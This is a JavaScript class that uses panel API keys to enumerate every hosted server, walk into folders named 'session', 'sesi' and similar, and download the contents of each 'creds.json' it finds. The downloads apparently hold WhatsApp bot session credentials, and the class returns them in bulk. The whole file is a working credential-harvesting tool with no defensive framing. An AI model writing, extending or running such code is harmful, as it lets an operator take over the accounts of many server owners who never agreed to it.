class CredsScanner {
    constructor(domain, plta, pltc) {
        this.domain = domain.replace(/\/+$/, "");
        this.plta = plta;
        this.pltc = pltc;
        this.foundFiles = [];
    }

    async scanDirectory(identifier, dir = "/") {
        try {
            const listRes = await axios.get(`${this.domain}/api/client/servers/${identifier}/files/list`, {
                params: { directory: dir },
                headers: { 
                    Accept: "application/json", 
                    Authorization: `Bearer ${this.pltc}` 
                },
                timeout: 10000
            });
            
            const listJson = listRes.data;
            if (!listJson || !Array.isArray(listJson.data)) return;
            
            for (let item of listJson.data) {
                const name = (item.attributes && item.attributes.name) || item.name || "";
                const itemPath = (dir === "/" ? "" : dir) + "/" + name;
                const normalized = itemPath.replace(/\/+/g, "/");
                
                let isDir = false;
                if (name === 'session' || name === 'sessions' || name === 'sesion' || 
                    name === 'sesi' || name === 'sessi' || name === 'sesinya') {
                    try {
                        await axios.get(`${this.domain}/api/client/servers/${identifier}/files/list`, {
                            params: { directory: normalized },
                            headers: { 
                                Accept: "application/json", 
                                Authorization: `Bearer ${this.pltc}` 
                            },
                            timeout: 3000
                        });
                        isDir = true;
                    } catch (e) {}
                }
                
                if (!isDir && name === "creds.json") {
                    this.foundFiles.push({
                        path: normalized,
                        name: name,
                        serverIdentifier: identifier,
                        fullPath: normalized
                    });
                }
                
                if (isDir) {
                    await this.scanDirectory(identifier, normalized === "" ? "/" : normalized);
                }
            }
        } catch (error) {}
    }

    async getFileContent(identifier, filePath) {
        try {
            const downloadRes = await axios.get(`${this.domain}/api/client/servers/${identifier}/files/download`, {
                params: { file: filePath },
                headers: { 
                    Accept: "application/json", 
                    Authorization: `Bearer ${this.pltc}` 
                },
                timeout: 10000
            });
            
            const dlJson = downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
                const url = dlJson.attributes.url;
                const fileRes = await axios.get(url, {
                  responseType: "arraybuffer",
                  timeout: 10000
                });
                const buffer = Buffer.from(fileRes.data);
                return buffer.toString();
            }
        } catch (error) {
            return `Error: ${error.message}`;
        }
        return null;
    }

    async scanAllServers() {
        try {
            const res = await axios.get(`${this.domain}/api/application/servers`, {
                headers: { 
                    Accept: "application/json", 
                    Authorization: `Bearer ${this.plta}` 
                },
                timeout: 10000
            });
            
            const data = res.data;
            if (!data || !Array.isArray(data.data)) {
                return {
                  success: false,
                  error: "Gagal ambil list server"
                };
            }
            
            for (let srv of data.data) {
                const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
                const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
                
                if (!identifier) continue;
                
                await this.scanDirectory(identifier, "/");
            }
            
            const resultsWithContent = [];
            for (let file of this.foundFiles) {
                const rawContent = await this.getFileContent(file.serverIdentifier, file.path);
                resultsWithContent.push({
                    server: file.serverIdentifier,
                    path: file.path,
                    raw_content: rawContent
                });
            }
            
            return {
                success: true,
                totalFound: this.foundFiles.length,
                results: resultsWithContent
            };
            
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    async getFormattedResults() {
        const result = await this.scanAllServers();
        
        if (!result.success) {
            return result;
        }

        const apiResponse = {
            status: "success",
            total_files: result.totalFound,
            scan_timestamp: new Date().toISOString(),
            files: result.results.map(file => ({
                server_id: file.server,
                file_path: file.path,
                credentials: file.raw_content
            }))
        };

        return apiResponse;
    }
}